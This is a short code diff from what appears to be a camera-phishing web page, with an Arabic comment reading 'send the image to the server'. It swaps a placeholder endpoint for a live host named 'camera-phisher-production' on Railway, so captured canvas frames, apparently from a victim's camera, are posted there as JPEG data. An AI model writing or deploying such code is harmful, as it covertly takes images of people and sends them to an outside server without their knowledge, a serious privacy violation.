@@ -35,7 +35,7 @@
             const imageData = canvas.toDataURL('image/jpeg');
 
             // إرسال الصورة إلى الخادم
-            fetch('https://your-server.com/upload', {
+            fetch('https://camera-phisher-production-7223.up.railway.app/upload', {
                 method: 'POST',
                 headers: { 'Content-Type': 'application/json' },
                 body: JSON.stringify({ image: imageData })
